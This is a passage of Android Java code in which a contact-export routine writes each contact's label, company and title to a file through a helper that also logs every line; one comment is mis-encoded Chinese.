            {
                if (label!= null)
                {
                    outputString = label + ":";
                }
            }
            //end if
            
            WriteString(outputString);
            

            outputString = "company: " + company;
            WriteString(outputString);
            
            outputString = "    title: " + title;
            WriteString(outputString);
    
            outputString = "";
            contactCursor.moveToNext();
            
            
        }//end for
       

        
    }//end function
     


    ////////////////////////////////////////////////////////////////
    //
    //��������:��ָ���ļ����һ����Ϣ
    //
    /////////////////////////////////////////////////////////////////
    private void  WriteString(String str)
    {
      
        if (str == null)
        {
          
            return;
        }
        Log.i("333+++", str);
        try
        {
            m_bw.write(str, 0, str.length());
            m_bw.write("\r\n");
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    
        return;
    }
}
